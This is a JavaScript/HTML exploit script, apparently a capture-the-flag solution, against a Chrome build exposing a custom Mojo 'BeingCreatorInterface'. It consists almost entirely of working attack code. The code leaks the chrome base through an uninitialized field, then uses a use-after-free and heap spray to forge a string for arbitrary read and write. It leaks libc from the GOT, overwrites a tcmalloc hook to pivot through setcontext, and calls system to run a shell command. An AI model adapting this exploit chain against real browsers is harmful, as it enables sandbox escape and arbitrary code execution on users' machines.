<script src="/mojo_bindings.js"></script>
<script src="/being_creator_interface.mojom.js"></script>
<script>
    sleep = seconds => new Promise(resolve => setTimeout(resolve, seconds))

    // Server
    setcontext = 0x474d0n
    puts_offset = 0x71910n
    system = 0x449c0n

    setcontext = 0x52070n
    puts_offset = 0x809c0n
    system = 0x4f440n

    async function waitFor(predicate) {
        while(!predicate())
            await sleep(100)
    }

    const log = x => new Image().src = '/?log:'+x

    async function poc() {
        mojo;
        x = new blink.mojom.BeingCreatorInterfacePtr()
        Mojo.bindInterface(blink.mojom.BeingCreatorInterface.name,
            mojo.makeRequest(x).handle, "context")

        function FoodInterfaceImpl() {
            this.binding = new mojo.Binding(blink.mojom.FoodInterface, this)
        }

        let ITEM_TO_FREE = null;

        const fake_string = async (address) =>
        {
            let modified, food, food_ptr, done = 0;

            FoodInterfaceImpl.prototype = {
                getWeight: async () => {
                    try {
                        target.ptr.reset()
                        after_target.map(
                            person => person.cat.ptr.reset())

                        await Promise.all(spray.map(
                            heap => heap.cat.setName(Array(0x40).join('.'))))

                        if(ITEM_TO_FREE !== null)
                            await spray[ITEM_TO_FREE].cat.setName('.'.padStart(0x40))

                        modified = (await x.createPerson()).person

                        // Populate std::string after modifying is_ptr field
                        const dv = new BigUint64Array(2)
                        dv[0] = BigInt(address)
                        dv[1] = BigInt(0x1000)
                        await modified.setName(dv.buffer)
                        done = 1

                        return {
                            // modify string::is_ptr
                            weight: 0x8000000000000000
                        };
                    } catch (e) {
                        log(e)
                    }
                }
            }
            target = (await x.createCat()).cat
            // Free after freeing target
            after_target = await Promise.all([...Array(2).keys()].map(_ => x.createCat()))
            // Allocate after freeing target
            spray = await Promise.all([...Array(24).keys()].map(_ => x.createCat()))

            food = new FoodInterfaceImpl()
            food_ptr = new blink.mojom.FoodInterfacePtr()
            food.binding.bind(mojo.makeRequest(food_ptr))
            await Promise.all(spray.map(heap => heap.cat.setName('')))

            target.cookAndEat(food_ptr)
            await waitFor(() => done)

            return modified
        }

        try {
            // weight field is unintialized
            // we can leak /chrome binary base
            ages = []
            for (var i = 0; i < 16; i++) {
                // First, alloc and free a being
                _ = (await x.createCat()).cat
                _.ptr.reset()

                // Allocate n times for getting useful values from heap
                cat1 = (await x.createPerson()).person
                cat1 = (await x.createPerson()).person
                age = (await cat1.getWeight()).weight

                ages.push(age)
                if ((age & 0xfff) === 0x720) {
                    base = age - 0x2b16720
                    break
                }
            }
            // Just for logging
            ages.map((age, i) => log('/age:' + i + ":" + age.toString(16)))

            // First run does not make a fake string, just determines ITEM_TO_FREE
            await fake_string(base)

            // cf) Determining which item of spray is modified, so we can free it
            for(var i = 0; i < spray.length; i++) {
                const str = String.fromCharCode.apply(null, (await spray[i].cat.getName()).name)
                if(str !== '.'.repeat(0x3f)) {
                    log('/item-to-free:'+i+':')
                    ITEM_TO_FREE = i
                }
            }

            // First UAF to get .got.plt through getName
            modified = await fake_string(0x95285e8 + base)

            leaked = (await modified.getName()).name
            dv = new DataView(leaked.buffer)

            puts = dv.getBigUint64(0x38, true)
            libc = puts - puts_offset
            log('/libc:' + libc.toString(16))

            modified_ = await fake_string(base + 0x953b558)

            // tcmalloc hooks via g_chain_head: see malloc()
            data = new BigUint64Array(0xf0 / 8)

            // points data[1]
            data[0] = BigInt(base + 0x953b558 + 8)

            // originally points TCMalloc()
            data[1] = BigInt(libc + setcontext)

            // cat /home/user/flag
            data[5] = BigInt(0x6d6f682f20746163n)
            data[6] = BigInt(0x662f726573752f65n)
            data[7] = BigInt(0x67616cn)

            // rsp
            data[0xa8 / 8] = BigInt(base + 0x953b558 + 0x10000)
            // rip
            data[0xb0 / 8] = BigInt(libc + system)
            // fldenv
            data[0xe8 / 8] = BigInt(base + 0x953b558 + 0x10000)
            // rdi: cmd
            data[0x70 / 8] = BigInt(base + 0x953b558 + 0x28)

            await modified_.setName(data.buffer)
        } catch (e) {
            log(e)
        }
    };
    poc()
</script>